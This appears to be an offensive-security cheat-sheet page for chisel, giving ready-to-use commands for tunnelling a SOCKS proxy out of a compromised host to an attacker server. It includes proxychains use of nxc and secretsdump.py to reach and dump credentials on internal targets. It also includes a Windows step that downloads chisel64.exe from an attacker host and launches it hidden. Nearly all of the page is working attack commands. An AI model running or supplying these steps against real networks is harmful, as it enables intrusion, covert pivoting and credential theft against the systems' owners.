title: chisel
html:
chisel

> SOCKS proxy through a compromised host. Use when you need to reach an internal network. Fast to deploy, works through firewalls.

Setup

Server (attacker)

chisel server --reverse -p 8888

Client (compromised host)

# SOCKS proxy (most common)
chisel client ATTACKER_IP:8888 R:1080:socks

# Specific port forward
chisel client ATTACKER_IP:8888 R:LOCAL_PORT:TARGET_IP:REMOTE_PORT

proxychains Config

# /tmp/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080

Usage

proxychains4 -f /tmp/proxychains.conf nxc smb <target-ip> -u user -p pass
proxychains4 -f /tmp/proxychains.conf secretsdump.py ...

Windows Client Deployment

Invoke-WebRequest -Uri "http://ATTACKER:8080/chisel64.exe" -OutFile "C:\Users\Public\c.exe"
Start-Process "C:\Users\Public\c.exe" -ArgumentList "client","ATTACKER:8888","R:1080:socks" -WindowStyle Hidden

Limitations

- Kerberos multi-step auth may fail through SOCKS — use Ligolo-ng for Kerberos - NTLM auth works fine - AV may quarantine the binary
